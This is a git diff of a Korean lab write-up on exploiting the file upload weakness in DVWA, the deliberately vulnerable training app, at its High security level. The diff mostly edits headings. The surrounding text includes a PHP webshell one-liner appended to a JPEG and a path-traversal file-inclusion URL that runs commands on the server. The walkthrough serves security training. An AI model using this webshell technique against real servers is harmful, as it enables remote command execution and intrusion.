@@ -119,7 +119,7 @@ Content-Type: image/gif
 ```
 
 
-아래 디렉토리로 webshell upload.
+-> 아래 디렉토리로 webshell upload.
 ```bash
 -rw-r--r--. 1 apache apache 10596 Aug  3 12:21 webshell.php
 [user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php
@@ -128,9 +128,7 @@ Content-Type: image/gif
 
 ```
 
-php 환경에서 /dvwa/hackable/uploads/webshell.php 접속 시 **탈취** 가능
-
-
+-> php 환경에서 /dvwa/hackable/uploads/webshell.php 접속 시 **탈취** 가능
 
 ```php
 <?php  
@@ -139,21 +137,20 @@ if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to�
         ( $uploaded_size < 100000 ) &&        getimagesize( $uploaded_tmp ) ) {
 ```
 
+위 코드의 정리를 하자면 아래와 같다.
 
-**High Level 필터 기능**
+**High Level 소스코드는 3가지 필터 기능 보유**
 1. png, jpeg, jpg
 2. file size
 3. image
 
 
-**소스 코드 문제**
+**소스 코드 취약점 문제**
 1. upload 경로 위치 ->  web root
 2. 이미지 파일이기 때문에 100% 안전하지 않음
 
 
-
-
-*시나리오*
+*공격 시나리오*
 1. 이미지 jpeg 파일을 rocky linux로 복사
 2. 아래 명령어 실행
 	>PHP 악성 코드가 들어 있는 jpg 파일
@@ -162,6 +159,8 @@ if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to�
 
 ```
 echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
+
+-- URL Upload 폴더에 접근 및 실행
 
 dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
 ```
